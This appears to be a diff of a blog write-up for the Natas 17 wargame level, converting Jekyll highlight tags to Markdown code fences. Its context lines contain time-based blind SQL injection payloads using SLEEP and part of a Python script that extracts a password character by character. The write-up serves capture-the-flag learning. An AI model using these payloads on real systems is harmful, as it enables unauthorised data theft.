@@ -14,7 +14,7 @@ Natas 17 takes us back to Natas 15:
 
 Lets look at the source to see if we can find whats changed:
 
-{% highlight html %}
+```html
 <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -70,7 +70,7 @@ Username: <input name="username"><br>
 </div>
 </body>
 </html>
-{% endhighlight %}
+```
 
 Hmm... looks like they completely removed the response. I submitted the user name "natas18" (since I assume it will exist) and "asfdgshnt" since I do not think it will exist. I captured both requests and sent it to the Burp Comparer to see if we can find any diffrences:
 
@@ -86,9 +86,9 @@ As expected, the result is exactly the same. Since this is a blind sql injection
 
 Next I try the following query:
 
-{% highlight sql %}
+```sql
 Select * from users where username = "natas16"  AND LEFT(password, 1) COLLATE latin1_general_cs = "W" AND (SELECT SLEEP(5)) AND "1"="1";
-{% endhighlight %}
+```
 
 And I get the following output:
 
@@ -96,9 +96,9 @@ And I get the following output:
 
 Here is the string that I will need to submit:
 
-{% highlight sql %}
+```sql
 natas18"  AND LEFT(password, 1) COLLATE latin1_general_cs = "a" AND  (SELECT SLEEP(20)) AND "1"="1
-{% endhighlight %}
+```
 
 I capture a request in Burp and send it to the intruder but since this is a time base attack, I need to change the Number of threads to 1:
 
@@ -110,7 +110,7 @@ After running it I look at the response time and find the first letter of the pa
 
 Now lets script it!
 
-{% highlight python %}
+```python
 import urllib
 import urllib2
 import time
@@ -145,7 +145,7 @@ for i in range(1, 33):
             password+=Chars[j]
             print password
             break
-{% endhighlight %}
+```
 
 The first time I run it I get a weird issue:
 
